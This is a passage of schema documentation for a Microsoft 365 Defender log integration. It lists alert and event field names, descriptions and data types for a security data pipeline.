| m365_defender.alert.evidence.saas_app_id | The identifier of the SaaS application. | keyword |
| m365_defender.alert.evidence.security_group_id | Unique identifier of the security group. | keyword |
| m365_defender.alert.evidence.sender_ip | IP address of the last detected mail server that relayed the message. | ip |
| m365_defender.alert.evidence.subject | Subject of the email. | keyword |
| m365_defender.alert.evidence.tags | Array of custom tags associated with an evidence instance, for example to denote a group of devices, high value assets, etc. | keyword |
| m365_defender.alert.evidence.threat_detection_methods | Collection of methods used to detect malware, phishing, or other threats found in the email. | keyword |
| m365_defender.alert.evidence.threats | Collection of detection names for malware or other threats found. | keyword |
| m365_defender.alert.evidence.type |  | keyword |
| m365_defender.alert.evidence.url | The Unique Resource Locator (URL). | keyword |
| m365_defender.alert.evidence.url_count | Number of embedded URLs in the email. | long |
| m365_defender.alert.evidence.urls | Collection of the URLs contained in this email. | keyword |
| m365_defender.alert.evidence.urn | Uniform resource name (URN) of the automated investigation where the cluster was identified. | keyword |
| m365_defender.alert.evidence.user_account.account_name | The user account's displayed name. | keyword |
| m365_defender.alert.evidence.user_account.azure_ad_user_id | The user object identifier in Azure AD. | keyword |
| m365_defender.alert.evidence.user_account.domain_name | The name of the Active Directory domain of which the user is a member. | keyword |
| m365_defender.alert.evidence.user_account.odata_type |  | keyword |
| m365_defender.alert.evidence.user_account.user_principal_name | The user principal name of the account in Azure AD. | keyword |
| m365_defender.alert.evidence.user_account.user_sid | The local security identifier of the user account. | keyword |
| m365_defender.alert.evidence.verdict | The decision reached by automated investigation. The possible values are: unknown, suspicious, malicious, noThreatsFound, unknownFutureValue. | keyword |
| m365_defender.alert.evidence.version | The version of the operating system platform. | keyword |
| m365_defender.alert.evidence.vm_metadata.cloud_provider | The cloud provider hosting the virtual machine. The possible values are: unknown, azure, unknownFutureValue. | keyword |
| m365_defender.alert.evidence.vm_metadata.odata_type |  | keyword |
| m365_defender.alert.evidence.vm_metadata.resource_id | Unique identifier of the Azure resource. | keyword |
| m365_defender.alert.evidence.vm_metadata.subscription_id | Unique identifier of the Azure subscription the customer tenant belongs to. | keyword |
| m365_defender.alert.evidence.vm_metadata.vm_id | Unique identifier of the virtual machine instance. | keyword |
| m365_defender.alert.first_activity_datetime | The earliest activity associated with the alert. | date |
| m365_defender.alert.id | Unique identifier to represent the alert resource. | keyword |
| m365_defender.alert.incident_id | Unique identifier to represent the incident this alert resource is associated with. | keyword |
| m365_defender.alert.incident_web_url.domain |  | keyword |
| m365_defender.alert.incident_web_url.extension |  | keyword |
| m365_defender.alert.incident_web_url.fragment |  | keyword |
| m365_defender.alert.incident_web_url.full |  | keyword |
| m365_defender.alert.incident_web_url.original |  | keyword |
| m365_defender.alert.incident_web_url.password |  | keyword |
| m365_defender.alert.incident_web_url.path |  | keyword |
| m365_defender.alert.incident_web_url.port |  | long |
| m365_defender.alert.incident_web_url.query |  | keyword |
| m365_defender.alert.incident_web_url.scheme |  | keyword |
| m365_defender.alert.incident_web_url.username |  | keyword |
| m365_defender.alert.last_activity_datetime | The oldest activity associated with the alert. | date |
| m365_defender.alert.last_update_datetime | Time when the alert was last updated at Microsoft 365 Defender. | date |
| m365_defender.alert.mitre_techniques | The attack techniques, as aligned with the MITRE ATT&CK framework. | keyword |
| m365_defender.alert.odata_type |  | keyword |
| m365_defender.alert.provider_alert_id | The ID of the alert as it appears in the security provider product that generated the alert. | keyword |
| m365_defender.alert.recommended_actions | Recommended response and remediation actions to take in the event this alert was generated. | keyword |
| m365_defender.alert.resolved_datetime | Time when the alert was resolved. | date |
| m365_defender.alert.service_source | The service or product that created this alert. Possible values are: microsoftDefenderForEndpoint, microsoftDefenderForIdentity, microsoftCloudAppSecurity, microsoftDefenderForOffice365, microsoft365Defender, aadIdentityProtection, appGovernance, dataLossPrevention. | keyword |
| m365_defender.alert.severity | Indicates the possible impact on assets. The higher the severity the bigger the impact. Typically higher severity items require the most immediate attention. Possible values are: unknown, informational, low, medium, high, unknownFutureValue. | keyword |
| m365_defender.alert.status | The status of the alert. Possible values are: new, inProgress, resolved, unknownFutureValue. | keyword |
| m365_defender.alert.tenant_id | The Azure Active Directory tenant the alert was created in. | keyword |
| m365_defender.alert.threat_display_name | The threat associated with this alert. | keyword |
| m365_defender.alert.threat_family_name | Threat family associated with this alert. | keyword |
| m365_defender.alert.title | Brief identifying string value describing the alert. | keyword |
| m365_defender.alert.web_url.domain |  | keyword |
| m365_defender.alert.web_url.extension |  | keyword |
| m365_defender.alert.web_url.fragment |  | keyword |
| m365_defender.alert.web_url.full |  | keyword |
| m365_defender.alert.web_url.original |  | keyword |
| m365_defender.alert.web_url.password |  | keyword |
| m365_defender.alert.web_url.path |  | keyword |
| m365_defender.alert.web_url.port |  | long |
| m365_defender.alert.web_url.query |  | keyword |
| m365_defender.alert.web_url.scheme |  | keyword |
| m365_defender.alert.web_url.username |  | keyword |
| tags | User defined tags. | keyword |


### event

This is the `event` dataset.

#### Example

**Exported fields**

| Field | Description | Type |
|---|---|---|
| @timestamp | Event timestamp. | date |
| Target.process.command_line | Full command line that started the process, including the absolute path to the executable, and all arguments. Some arguments may be filtered to protect sensitive information. | wildcard |
| Target.process.command_line.text | Multi-field of `Target.process.command_line`. | text |
| Target.process.executable | Absolute path to the process executable. | keyword |
| Target.process.executable.text | Multi-field of `Target.process.executable`. | text |
| Target.process.name | Process name. Sometimes called program name or similar. | keyword |
| Target.process.name.text | Multi-field of `Target.process.name`. | text |
| cloud.account.id | The cloud account or organization id used to identify different entities in a multi-tenant environment. Examples: AWS account id, Google Cloud ORG Id, or other unique identifier. | keyword |
| cloud.availability_zone | Availability zone in which this host is running. | keyword |
| cloud.image.id | Image ID for the cloud instance. | keyword |
| cloud.instance.id | Instance ID of the host machine. | keyword |
| cloud.instance.name | Instance name of the host machine. | keyword |
| cloud.machine.type | Machine type of the host machine. | keyword |
| cloud.project.id | Name of the project in Google Cloud. | keyword |
| cloud.provider | Name of the cloud provider. Example values are aws, azure, gcp, or digitalocean. | keyword |
| cloud.region | Region in which this host is running. | keyword |
| container.id | Unique container id. | keyword |
| container.image.name | Name of the image the container was built on. | keyword |
| container.labels | Image labels. | object |
| container.name | Container name. | keyword |
| data_stream.dataset | Data stream dataset. | constant_keyword |
| data_stream.namespace | Data stream namespace. | constant_keyword |
| data_stream.type | Data stream type. | constant_keyword |
| destination.address | Some event destination addresses are defined ambiguously. The event will sometimes list an IP, a domain or a unix socket.  You should always store the raw address in the `.address` field. Then it should be duplicated to `.ip` or `.domain`, depending on which one it is. | keyword |
| destination.domain | The domain name of the destination system. This value may be a host name, a fully qualified domain name, or another host naming format. The value may derive from the original event or be added from enrichment. | keyword |
| destination.geo.city_name | City name. | keyword |
| destination.geo.continent_name | Name of the continent. | keyword |
| destination.geo.country_iso_code | Country ISO code. | keyword |
| destination.geo.country_name | Country name. | keyword |
| destination.geo.location | Longitude and latitude. | geo_point |
| destination.geo.region_iso_code | Region ISO code. | keyword |
| destination.geo.region_name | Region name. | keyword |
| destination.ip | IP address of the destination (IPv4 or IPv6). | ip |
| destination.port | Port of the destination. | long |
| dll.Ext.size | Size of the dll executable. | long |
| dll.hash.md5 | MD5 hash. | keyword |
| dll.hash.sha1 | SHA1 hash. | keyword |
| dll.hash.sha256 | SHA256 hash. | keyword |
| dll.name | Name of the library. This generally maps to the name of the file on disk. | keyword |
| dll.path | Full file path of the library. | keyword |
| dns.answers |  | object |
| dns.header_flags | Array of 2 letter DNS header flags. | keyword |
| dns.question.class | The class of records being queried. | keyword |
| dns.question.name | The name being queried. If the name field contains non-printable characters (below 32 or above 126), those characters should be represented as escaped base 10 integers (\DDD). Back slashes and quotes should be escaped. Tabs, carriage returns, and line feeds should be converted to \t, \r, and \n respectively. | keyword |
| dns.question.type | The type of record being queried. | keyword |
| dns.response_code | The DNS response code. | keyword |
| ecs.version | ECS version this event conforms to. `ecs.version` is a required field and must exist in all events. When querying across multiple indices -- which may conform to slightly different ECS versions -- this field lets integrations adjust to the schema version of the events. | keyword |
| email.direction | The direction of the message based on the sending and receiving domains. | keyword |
| email.from.address | The email address of the sender, typically from the RFC 5322 `From:` header field. | keyword |
| email.local_id | Unique identifier given to the email by the source that created the event. Identifier is not persistent across hops. | keyword |
| email.message_id | Identifier from the RFC 5322 `Message-ID:` email header that refers to a particular email message. | wildcard |
| email.subject | A brief summary of the topic of the message. | keyword |
| email.subject.text | Multi-field of `email.subject`. | match_only_text |
| email.to.address | The email address of recipient | keyword |
| event.action | The action captured by the event. This describes the information in the event. It is more specific than `event.category`. Examples are `group-add`, `process-started`, `file-created`. The value is normally defined by the implementer. | keyword |
| event.category | This is one of four ECS Categorization Fields, and indicates the second level in the ECS category hierarchy. `event.category` represents the "big buckets" of ECS categories. For example, filtering on `event.category:process` yields all events relating to process activity. This field is closely related to `event.type`, which is used as a subcategory. This field is an array. This will allow proper categorization of some events that fall in multiple categories. | keyword |
| event.created | `event.created` contains the date/time when the event was first read by an agent, or by your pipeline. This field is distinct from `@timestamp` in that `@timestamp` typically contain the time extracted from the original event. In most situations, these two timestamps will be slightly different. The difference can be used to calculate the delay between your source generating an event, and the time when your agent first processed it. This can be used to monitor your agent's or pipeline's ability to keep up with your event source. In case the two timestamps are identical, `@timestamp` should be used. | date |
| event.dataset | Event dataset. | constant_keyword |
| event.id | Unique ID to describe the event. | keyword |
| event.kind | This is one of four ECS Categorization Fields, and indicates the highest level in the ECS category hierarchy. `event.kind` gives high-level information about what type of information the event contains, without being specific to the contents of the event. For example, values of this field distinguish alert events from metric events. The value of this field can be used to inform how these kinds of events should be handled. They may warrant different retention, different access control, it may also help understand whether the data is coming in at a regular interval or not. | keyword |
| event.module | Event module. | constant_keyword |
| event.original | Raw text message of entire event. Used to demonstrate log integrity or where the full log message (before splitting it up in multiple parts) may be required, e.g. for reindex. This field is not indexed and doc_values are disabled. It cannot be searched, but it can be retrieved from `_source`. If users wish to override this and index this field, please see `Field data types` in the `Elasticsearch Reference`. | keyword |
| event.outcome | This is one of four ECS Categorization Fields, and indicates the lowest level in the ECS category hierarchy. `event.outcome` simply denotes whether the event represents a success or a failure from the perspective of the entity that produced the event. Note that when a single transaction is described in multiple events, each event may populate different values of `event.outcome`, according to their perspective. Also note that in the case of a compound event (a single event that contains multiple logical events), this field should be populated with the value that best captures the overall success or failure from the perspective of the event producer. Further note that not all events will have an associated outcome. For example, this field is generally not populated for metric events, events with `event.type:info`, or any events for which an outcome does not make logical sense. | keyword |
| event.provider | Source of the event. Event transports such as Syslog or the Windows Event Log typically mention the source of an event. It can be the name of the software that generated the event (e.g. Sysmon, httpd), or of a subsystem of the operating system (kernel, Microsoft-Windows-Security-Auditing). | keyword |
| event.reference | Reference URL linking to additional information about this event. This URL links to a static definition of this event. Alert events, indicated by `event.kind:alert`, are a common use case for this field. | keyword |
| event.severity | The numeric severity of the event according to your event source. What the different severity values mean can be different between sources and use cases. It's up to the implementer to make sure severities are consistent across events from the same source. The Syslog severity belongs in `log.syslog.severity.code`. `event.severity` is meant to represent the severity according to the event source (e.g. firewall, IDS). If the event source does not publish its own severity, you may optionally copy the `log.syslog.severity.code` to `event.severity`. | long |
| event.type | This is one of four ECS Categorization Fields, and indicates the third level in the ECS category hierarchy. `event.type` represents a categorization "sub-bucket" that, when used along with the `event.category` field values, enables filtering events down to a level appropriate for single visualization. This field is an array. This will allow proper categorization of some events that fall in multiple event types. | keyword |
| file.code_signature.exists | Boolean to capture if a signature is present. | boolean |
| file.code_signature.subject_name | Subject name of the code signer | keyword |
| file.code_signature.trusted | Stores the trust status of the certificate chain. Validating the trust of the certificate chain may be complicated, and this field should only be populated by tools that actively check the status. | boolean |
| file.directory | Directory where the file is located. It should include the drive letter, when appropriate. | keyword |
| file.extension | File extension, excluding the leading dot. Note that when the file name has multiple extensions (example.tar.gz), only the last one should be captured ("gz", not "tar.gz"). | keyword |
| file.hash.md5 | MD5 hash. | keyword |
| file.hash.sha1 | SHA1 hash. | keyword |
| file.hash.sha256 | SHA256 hash. | keyword |
| file.name | Name of the file including the extension, without the directory. | keyword |
| file.path | Full path to the file, including the file name. It should include the drive letter, when appropriate. | keyword |
| file.path.text | Multi-field of `file.path`. | match_only_text |
| file.size | File size in bytes. Only relevant when `file.type` is "file". | long |
| file.x509.issuer.common_name | List of common name (CN) of issuing certificate authority. | keyword |
| file.x509.not_after | Time at which the certificate is no longer considered valid. | date |
| file.x509.serial_number | Unique serial number issued by the certificate authority. For consistency, if this value is alphanumeric, it should be formatted without colons and uppercase characters. | keyword |
| host.architecture | Operating system architecture. | keyword |
| host.containerized | If the host is a container. | boolean |
| host.domain | Name of the domain of which the host is a member. For example, on Windows this could be the host's Active Directory domain or NetBIOS domain name. For Linux this could be the domain of the host's LDAP provider. | keyword |
| host.hostname | Hostname of the host. It normally contains what the `hostname` command returns on the host machine. | keyword |
| host.id | Unique host id. As hostname is not always unique, use values that are meaningful in your environment. Example: The current usage of `beat.name`. | keyword |
| host.ip | Host ip addresses. | ip |
| host.mac | Host mac addresses. | keyword |
| host.name | Name of the host. It can contain what `hostname` returns on Unix systems, the fully qualified domain name, or a name specified by the user. The sender decides which value to use. | keyword |
| host.os.build | OS build information. | keyword |
| host.os.codename | OS codename, if any. | keyword |
| host.os.family | OS family (such as redhat, debian, freebsd, windows). | keyword |
| host.os.full | Operating system name, including the version or code name. | keyword |
| host.os.full.text | Multi-field of `host.os.full`. | match_only_text |
| host.os.kernel | Operating system kernel version as a raw string. | keyword |
| host.os.name | Operating system name, without the version. | keyword |
| host.os.name.text | Multi-field of `host.os.name`. | text |
| host.os.platform | Operating system platform (such centos, ubuntu, windows). | keyword |
| host.os.version | Operating system version as a raw string. | keyword |
| host.type | Type of host. For Cloud providers this can be the machine type like `t2.medium`. If vm, this could be the container, for example, or other information meaningful in your environment. | keyword |
| input.type | Input type | keyword |
| log.offset | Log offset | long |
| m365_defender.event.aad_device_id | Unique identifier for the device in Azure AD. | keyword |
| m365_defender.event.account.display_name | Name of the account user displayed in the address book. Typically a combination of a given or first name, a middle initiation, and a last name or surname. | keyword |
| m365_defender.event.account.domain | Domain of the account. | keyword |
| m365_defender.event.account.id | An identifier for the account as found by Microsoft Defender for Cloud Apps. Could be Azure Active Directory ID, user principal name, or other identifiers. | keyword |
| m365_defender.event.account.name | User name of the account. | keyword |
| m365_defender.event.account.object_id | Unique identifier for the account in Azure Active Directory. | keyword |
| m365_defender.event.account.sid | Security Identifier (SID) of the account. | keyword |
| m365_defender.event.account.type | Type of user account, indicating its general role and access levels, such as Regular, System, Admin, DcAdmin, System, Application. | keyword |
| m365_defender.event.account.upn | User principal name (UPN) of the account. | keyword |
| m365_defender.event.action.result | Result of the action. | keyword |
| m365_defender.event.action.trigger | Indicates whether an action was triggered by an administrator (manually or through approval of a pending automated action), or by some special mechanism, such as a ZAP or Dynamic Delivery. | keyword |
| m365_defender.event.action.type | Type of activity that triggered the event. See the [in-portal schema reference](https://learn.microsoft.com/en-us/microsoft-365/security/defender/advanced-hunting-schema-tables?view=o365-worldwide#get-schema-information-in-the-security-center) for details. | keyword |
| m365_defender.event.action.value | Action taken on the entity. | keyword |
| m365_defender.event.active_users | An array of all users that are logged on the machine at the time of the event. | keyword |
| m365_defender.event.activity.objects | List of objects, such as files or folders, that were involved in the recorded activity. | flattened |
| m365_defender.event.activity.type | Type of activity that triggered the event. | keyword |
| m365_defender.event.additional_fields | Additional information about the entity or event in JSON array format. | flattened |
| m365_defender.event.alert.categories |  | keyword |
| m365_defender.event.alert.category | Type of threat indicator or breach activity identified by the alert. | keyword |
| m365_defender.event.alert.id | Unique identifier for the alert. | keyword |
| m365_defender.event.app_guard_container_id | Identifier for the virtualized container used by Application Guard to isolate browser activity. | keyword |
| m365_defender.event.app_instance_id |  | long |
| m365_defender.event.application | Application that performed the recorded action. | keyword |
| m365_defender.event.application_id | Unique identifier for the application. | keyword |
| m365_defender.event.asset_value | Indicates the value of a device as assigned by the user. | keyword |
| m365_defender.event.attachment_count | Number of attachments in the email. | long |
| m365_defender.event.attack_techniques | MITRE ATT&CK techniques associated with the activity that triggered the alert. | keyword |
| m365_defender.event.authentication_details | List of pass or fail verdicts by email authentication protocols like DMARC, DKIM, SPF or a combination of multiple authentication types (CompAuth). | keyword |
| m365_defender.event.bulk_complaint_level | Threshold assigned to email from bulk mailers, a high bulk complaint level (BCL) means the email is more likely to generate complaints, and thus more likely to be spam. | long |
| m365_defender.event.category | The Advanced Hunting table name with 'AdvancedHunting-' prefix. | keyword |
| m365_defender.event.certificate.countersignature_time | Date and time the certificate was countersigned. | date |
| m365_defender.event.certificate.creation_time | Date and time the certificate was created. | date |
| m365_defender.event.certificate.expiration_time | Date and time the certificate is set to expire. | date |
| m365_defender.event.certificate.serial_number | Identifier for the certificate that is unique to the issuing certificate authority (CA). | keyword |
| m365_defender.event.city | City where the client IP address is geolocated. | keyword |
| m365_defender.event.client_version | Version of the endpoint agent or sensor running on the machine. | keyword |
| m365_defender.event.confidence_level | List of confidence levels of any spam or phishing verdicts. For spam, this column shows the spam confidence level (SCL), indicating if the email was skipped (-1), found to be not spam (0,1), found to be spam with moderate confidence (5,6), or found to be spam with high confidence (9). For phishing, this column displays whether the confidence level is "High" or "Low". | flattened |
| m365_defender.event.connected_networks | Networks that the adapter is connected to. Each JSON array contains the network name, category (public, private or domain), a description, and a flag indicating if it's connected publicly to the internet. | flattened |
| m365_defender.event.connectors | Custom instructions that define organizational mail flow and how the email was routed. | keyword |
| m365_defender.event.country_code | Two-letter code indicating the country where the client IP address is geolocated. | keyword |
| m365_defender.event.crl_distribution_point_urls | JSON array listing the URLs of network shares that contain certificates and certificate revocation lists (CRLs). | keyword |
| m365_defender.event.default_gateways | Default gateway addresses in JSON array format. | keyword |
| m365_defender.event.delivery.action | Delivery action of the email: Delivered, Junked, Blocked, or Replaced. | keyword |
| m365_defender.event.delivery.location | Location where the email was delivered: Inbox/Folder, On-premises/External, Junk, Quarantine, Failed, Dropped, Deleted items. | keyword |
| m365_defender.event.destination.device_name | Name of the device running the server application that processed the recorded action. | keyword |
| m365_defender.event.destination.ip_address | IP address of the device running the server application that processed the recorded action. | ip |
| m365_defender.event.destination.port | Destination port of related network communications or activity. | long |
| m365_defender.event.detection.methods | Methods used to detect malware, phishing, or other threats found in the email or at the time of click. | flattened |
| m365_defender.event.detection.source | Detection technology or sensor that identified the notable component or activity. | keyword |
| m365_defender.event.device.category | Broader classification that groups certain device types under the following categories: Endpoint, Network device, IoT, Unknown. | keyword |
| m365_defender.event.device.id | Unique identifier for the device or machine in the service. | keyword |
| m365_defender.event.device.name | Fully qualified domain name (FQDN) of the device, machine or endpoint. | keyword |
| m365_defender.event.device.sub_type | Additional modifier for certain types of devices, for example, a mobile device can be a tablet or a smartphone; only available if device discovery finds enough information about this attribute. | keyword |
| m365_defender.event.device.type | Type of device based on purpose and functionality, such as network device, workstation, server, mobile, gaming console, or printer. | keyword |
| m365_defender.event.device_dynamic_tags | Device tags assigned automatically using dynamic tagging rules. | keyword |
| m365_defender.event.device_manual_tags | Device tags created manually using the portal UI or public API. | keyword |
| m365_defender.event.dns.answers | The answers returned by the server from DNS query. | keyword |
| m365_defender.event.dns.header_flags | Array of 2 letter DNS header flags. | keyword |
| m365_defender.event.dns.qclass_name | The DNS class of records being queried. | keyword |
| m365_defender.event.dns.qtype_name | The type of DNS record being queried. | keyword |
| m365_defender.event.dns.query | The DNS query. | keyword |
| m365_defender.event.dns.rcode_name | The DNS response code. | keyword |
| m365_defender.event.dns_addresses | DNS server addresses in JSON array format. | keyword |
| m365_defender.event.email.action | Final action taken on the email based on filter verdict, policies, and user actions: Move message to junk mail folder, Add X-header, Modify subject, Redirect message, Delete message, send to quarantine, No action taken, Bcc message. | keyword |
| m365_defender.event.email.action_policy | Action policy that took effect: Antispam high-confidence, Antispam, Antispam bulk mail, Antispam phishing, Anti-phishing domain impersonation, Anti-phishing user impersonation, Anti-phishing spoof, Anti-phishing graph impersonation, Antimalware, Safe Attachments, Enterprise Transport Rules (ETR). | keyword |
| m365_defender.event.email.action_policy_guid | Unique identifier for the policy that determined the final mail action. | keyword |
| m365_defender.event.email.cluster_id | Identifier for the group of similar emails clustered based on heuristic analysis of their contents. | keyword |
| m365_defender.event.email.direction | Direction of the email relative to your network: Inbound, Outbound, Intra-org. | keyword |
| m365_defender.event.email.language | Detected language of the email content. | keyword |
| m365_defender.event.email.subject | Subject of the email. | keyword |
| m365_defender.event.entity_type | Type of object, such as a file, a process, a device, or a user. | keyword |
| m365_defender.event.evidence.direction | Indicates whether the entity is the source or the destination of a network connection. | keyword |
| m365_defender.event.evidence.role | How the entity is involved in an alert, indicating whether it is impacted or is merely related. | keyword |
| m365_defender.event.exclusion_reason | Indicates the reason for device exclusion. | keyword |
| m365_defender.event.exposure_level | Indicates the exposure level of a device. | keyword |
| m365_defender.event.failure_reason | Information explaining why the recorded action failed. | keyword |
| m365_defender.event.file.name | Name of the file that the recorded action was applied to. | keyword |
| m365_defender.event.file.origin_ip | IP address where the file was downloaded from. | ip |
| m365_defender.event.file.origin_referrer_url | URL of the web page that links to the downloaded file. | keyword |
| m365_defender.event.file.origin_url | URL where the file was downloaded from. | keyword |
| m365_defender.event.file.size | Size of the file in bytes. | long |
| m365_defender.event.file.type | File extension type. | keyword |
| m365_defender.event.folder_path | Folder containing the file that the recorded action was applied to. | keyword |
| m365_defender.event.initiating_process.account_domain | Domain of the account that ran the process responsible for the event. | keyword |
| m365_defender.event.initiating_process.account_name | User name of the account that ran the process responsible for the event. | keyword |
| m365_defender.event.initiating_process.account_object_id | Azure AD object ID of the user account that ran the process responsible for the event. | keyword |
| m365_defender.event.initiating_process.account_sid | Security Identifier (SID) of the account that ran the process responsible for the event. | keyword |
| m365_defender.event.initiating_process.account_upn | User principal name (UPN) of the account that ran the process responsible for the event. | keyword |
| m365_defender.event.initiating_process.command_line | Command line used to run the process that initiated the event. | keyword |
| m365_defender.event.initiating_process.creation_time | Date and time when the process that initiated the event was started. | date |
| m365_defender.event.initiating_process.file_name | Name of the process that initiated the event. | keyword |
| m365_defender.event.initiating_process.file_size | Size of the file that ran the process responsible for the event. | long |
| m365_defender.event.initiating_process.folder_path | Folder containing the process (image file) that initiated the event. | keyword |
| m365_defender.event.initiating_process.id | Process ID (PID) of the process that initiated the event. | long |
| m365_defender.event.initiating_process.integrity_level | Integrity level of the process that initiated the event. Windows assigns integrity levels to processes based on certain characteristics, such as if they were launched from an internet download. These integrity levels influence permissions to resources. | keyword |
| m365_defender.event.initiating_process.logon_id | Identifier for a logon session of the process that initiated the event. This identifier is unique on the same machine only between restarts. | keyword |
| m365_defender.event.initiating_process.md5 | MD5 hash of the process (image file) that initiated the event. | keyword |
| m365_defender.event.initiating_process.parent_creation_time | Date and time when the parent of the process responsible for the event was started. | date |
| m365_defender.event.initiating_process.parent_file_name | Name of the parent process that spawned the process responsible for the event. | keyword |
| m365_defender.event.initiating_process.parent_id | Process ID (PID) of the parent process that spawned the process responsible for the event. | long |
| m365_defender.event.initiating_process.sha1 | SHA-1 of the process (image file) that initiated the event. | keyword |
| m365_defender.event.initiating_process.sha256 | SHA-256 of the process (image file) that initiated the event. This field is usually not populated—use the SHA1 column when available. | keyword |
| m365_defender.event.initiating_process.signature_status | Information about the signature status of the process (image file) that initiated the event. | keyword |
| m365_defender.event.initiating_process.signer_type | Type of file signer of the process (image file) that initiated the event. | keyword |
| m365_defender.event.initiating_process.token_elevation | Token type indicating the presence or absence of User Access Control (UAC) privilege elevation applied to the process that initiated the event. | keyword |
| m365_defender.event.initiating_process.version_info_company_name | Company name from the version information of the process (image file) responsible for the event. | keyword |
| m365_defender.event.initiating_process.version_info_file_description | Description from the version information of the process (image file) responsible for the event. | keyword |
| m365_defender.event.initiating_process.version_info_internal_file_name | Internal file name from the version information of the process (image file) responsible for the event. | keyword |
| m365_defender.event.initiating_process.version_info_original_file_name | Original file name from the version information of the process (image file) responsible for the event. | keyword |
| m365_defender.event.initiating_process.version_info_product_name | Product name from the version information of the process (image file) responsible for the event. | keyword |
| m365_defender.event.initiating_process.version_info_product_version | Product version from the version information of the process (image file) responsible for the event. | keyword |
| m365_defender.event.internet_message_id | Public-facing identifier for the email that is set by the sending email system. | keyword |
| m365_defender.event.ip_address | Public IP address of the device from which the user clicked on the link or IP address assigned to the endpoint and used during related network communications. | ip |
| m365_defender.event.ip_addresses | JSON array containing all the IP addresses assigned to the adapter, along with their respective subnet prefix and IP address space, such as public, private, or link-local. | flattened |
| m365_defender.event.ip_category | Additional information about the IP address. | keyword |
| m365_defender.event.ip_tags | Customer-defined information applied to specific IP addresses and IP address ranges. | keyword |
| m365_defender.event.ipv4_dhcp | IPv4 address of DHCP server. | ip |
| m365_defender.event.ipv6_dhcp | IPv6 address of DHCP server. | ip |
| m365_defender.event.is_admin_operation | Indicates whether the activity was performed by an administrator. | boolean |
| m365_defender.event.is_anonymous_proxy | Indicates whether the IP address belongs to a known anonymous proxy. | boolean |
| m365_defender.event.is_azure_ad_joined | Boolean indicator of whether machine is joined to the Azure Active Directory. | boolean |
| m365_defender.event.is_azure_info_protection_applied | Indicates whether the file is encrypted by Azure Information Protection. | boolean |
| m365_defender.event.is_clicked_through | Indicates whether the user was able to click through to the original URL or was not allowed. | boolean |
| m365_defender.event.is_excluded | Determines if the device is currently excluded from Microsoft Defender for Vulnerability Management experiences. | boolean |
| m365_defender.event.is_external_user | Indicates whether a user inside the network doesn't belong to the organization's domain. | boolean |
| m365_defender.event.is_impersonated | Indicates whether the activity was performed by one user for another (impersonated) user. | boolean |
| m365_defender.event.is_internet_facing | Indicates whether the device is internet-facing. | boolean |
| m365_defender.event.is_local_admin | Boolean indicator of whether the user is a local administrator on the machine. | boolean |
| m365_defender.event.is_root_signer_microsoft | Indicates whether the signer of the root certificate is Microsoft and if the file is included in Windows operating system. | boolean |
| m365_defender.event.is_signed | Indicates whether the file is signed. | boolean |
| m365_defender.event.is_trusted | Indicates whether the file is trusted based on the results of the WinVerifyTrust function, which checks for unknown root certificate information, invalid signatures, revoked certificates, and other questionable attributes. | boolean |
| m365_defender.event.isp | Internet service provider (ISP) associated with the endpoint IP address. | keyword |
| m365_defender.event.issuer | Information about the issuing certificate authority (CA). | keyword |
| m365_defender.event.issuer_hash | Unique hash value identifying issuing certificate authority (CA). | keyword |
| m365_defender.event.join_type |  | keyword |
| m365_defender.event.local.ip | IP address assigned to the local device or machine used during communication. | ip |
| m365_defender.event.local.ip_type | Type of IP address, for example Public, Private, Reserved, Loopback, Teredo, FourToSixMapping, and Broadcast. | keyword |
| m365_defender.event.local.port | TCP port on the local machine used during communication. | long |
| m365_defender.event.location | City, country, or other geographic location associated with the event. | keyword |
| m365_defender.event.logon.id | Identifier for a logon session. This identifier is unique on the same machine only between restarts. | keyword |
| m365_defender.event.logon.type | Type of logon session, specifically: Interactive, Remote interactive (RDP) logons, Network, Batch, Service. | keyword |
| m365_defender.event.mac_address | MAC address of the network adapter. | keyword |
| m365_defender.event.machine_group | Machine group of the machine. This group is used by role-based access control to determine access to the machine. | keyword |
| m365_defender.event.md5 | MD5 hash of the file that the recorded action was applied to. | keyword |
| m365_defender.event.merged_device_ids | Previous device IDs that have been assigned to the same device. | keyword |
| m365_defender.event.merged_to_device_id | The most recent device ID assigned to a device. | keyword |
| m365_defender.event.model | Model name or number of the product from the vendor or manufacturer, only available if device discovery finds enough information about this attribute. | keyword |
| m365_defender.event.network.adapter_name | Name of the network adapter. | keyword |
| m365_defender.event.network.adapter_status | Operational status of the network adapter. For the possible values, refer to this enumeration. | keyword |
| m365_defender.event.network.adapter_type | Network adapter type. For the possible values, refer to this enumeration. | keyword |
| m365_defender.event.network.adapter_vendor |  | keyword |
| m365_defender.event.network.message_id | Unique identifier for the email, generated by Microsoft 365. | keyword |
| m365_defender.event.network_direction | The network direction used in DeviceNetworkEvents. | keyword |
| m365_defender.event.oauth_application_id |  | keyword |
| m365_defender.event.object.id | Unique identifier of the object that the recorded action was applied to. | keyword |
| m365_defender.event.object.name | Name of the object that the recorded action was applied to. | keyword |
| m365_defender.event.object.type | Type of object, such as a file or a folder, that the recorded action was applied to. | keyword |
| m365_defender.event.onboarding_status | Indicates whether the device is currently onboarded or not to Microsoft Defender for Endpoint or if the device is not supported. | keyword |
| m365_defender.event.operation_name |  | keyword |
| m365_defender.event.org_level.action | Action taken on the email in response to matches to a policy defined at the organizational level. | keyword |
| m365_defender.event.org_level.policy | Organizational policy that triggered the action taken on the email. | keyword |
| m365_defender.event.os.architecture | Architecture of the operating system running on the machine. | keyword |
| m365_defender.event.os.build | Build version of the operating system running on the machine. | keyword |
| m365_defender.event.os.distribution | Distribution of the OS platform, such as Ubuntu or RedHat for Linux platforms. | keyword |
| m365_defender.event.os.platform | Platform of the operating system running on the machine. This indicates specific operating systems, including variations within the same family, such as Windows 11, Windows 10 and Windows 7. | keyword |
| m365_defender.event.os.version | Version of the operating system running on the machine. | keyword |
| m365_defender.event.os.version_info | Additional information about the OS version, such as the popular name, code name, or version number. | keyword |
| m365_defender.event.port | TCP port used during communication. | long |
| m365_defender.event.previous.file_name | Original name of the file that was renamed as a result of the action. | keyword |
| m365_defender.event.previous.folder_path | Original folder containing the file before the recorded action was applied. | keyword |
| m365_defender.event.previous.registry_key | Original registry key of the registry value before it was modified. | keyword |
| m365_defender.event.previous.registry_value_data | Original data of the registry value before it was modified. | keyword |
| m365_defender.event.previous.registry_value_name | Original name of the registry value before it was modified. | keyword |
| m365_defender.event.process.command_line | Command line used to create the new process. | keyword |
| m365_defender.event.process.creation_time | Date and time the process was created. | date |
| m365_defender.event.process.id | Process ID (PID) of the newly created process. | long |
